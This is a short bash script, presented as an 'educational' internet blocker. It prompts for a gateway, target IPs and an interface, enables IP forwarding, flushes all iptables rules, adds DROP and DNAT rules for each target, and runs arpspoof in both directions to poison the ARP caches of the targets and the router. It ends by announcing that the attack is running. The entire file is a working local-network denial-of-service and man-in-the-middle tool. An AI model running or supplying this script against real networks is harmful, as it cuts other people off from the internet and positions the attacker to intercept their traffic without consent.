#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Requires: arpspoof, iptables, and root privileges

echo "Enter Router Gateway IP:"
read -p "> " GATEWAY
echo "Enter Target IP (space-separated for multiple):"
read -p "> " TARGET_IPS
echo "Enter Interface (wlan0):"
read -p "> " INTERFACE

# Enable IP Forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush Iptables existing rules
iptables -F
iptables -X
iptables -t nat -F

for TARGET_IP in $TARGET_IPS; do
    iptables -A FORWARD -s "$TARGET_IP" -j DROP
    iptables -A FORWARD -d "$TARGET_IP" -j DROP
    iptables -t nat -A PREROUTING -s "$TARGET_IP" -j DNAT --to-destination "$GATEWAY"

    (
        arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
        arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
    ) &
done
echo "Attack is running...!!!"
